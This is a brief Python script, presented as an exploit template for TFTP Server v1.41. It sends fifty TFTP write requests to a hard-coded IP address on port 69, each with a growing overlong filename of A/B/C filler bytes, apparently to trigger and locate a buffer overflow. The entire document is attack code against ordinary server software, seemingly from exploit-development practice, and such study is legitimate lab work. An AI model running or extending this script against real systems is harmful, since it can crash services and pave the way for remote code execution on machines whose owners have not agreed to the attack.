#!/usr/bin/env python

#####################################
# TFTP Server v1.41 Exploit Template
# Author: Ted Tagami
#####################################

import socket
import time
import subprocess

## Params
host = '192.168.103.153'
port = 69
iterations = 50
length = 1300

## Payload Processing
header = "\x00\x02"
mode = "netascii"

## Establish UDP Socket
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

for x in range(iterations):
    filename = "A" * 1232 + "B" * 4 + "C" * (1300 - 1236)
    filename += "C" * 100 * x

    print("Length: " + str(len(filename.encode('utf-8'))))
    payload = header + filename + "\0" + mode + "\0"
    socket.sendto(payload,(host,port))
    time.sleep(2)
